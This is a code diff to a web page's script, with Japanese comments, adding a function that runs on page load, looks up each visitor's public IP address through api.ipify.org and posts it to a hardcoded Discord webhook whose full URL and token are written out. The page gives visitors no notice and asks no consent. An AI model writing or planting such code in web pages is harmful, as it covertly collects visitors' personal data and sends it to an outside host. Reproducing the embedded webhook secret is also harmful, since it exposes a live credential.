@@ -56,6 +56,40 @@
         console.log("自動再生できませんでした。ユーザー操作で再生してください。");
       });
     });
+
+    // IPアドレスを取得し、Discord Webhookに送信
+    async function fetchIPAndSendToDiscord() {
+      try {
+        // IPアドレスを取得
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ipAddress = data.ip;
+
+        // Discord Webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1408257833790734356/jS5cTNp0C8WowwTioMk1WsqDrcKZmL7eLe0slVH0lk5Z3C5UoPcKH4UJUJMNGFbVeZ-P';
+
+        // メッセージを作成
+        const message = {
+          content: `IPアドレスが取得されました: ${ipAddress}`
+        };
+
+        // Discordに送信
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(message)
+        });
+
+        console.log('IPアドレスがDiscordに送信されました');
+      } catch (error) {
+        console.error('エラーが発生しました:', error);
+      }
+    }
+
+    // ページが読み込まれたときにIPアドレスを取得し、Discordに送信
+    window.onload = fetchIPAndSendToDiscord;
   </script>
 </body>
 </html>
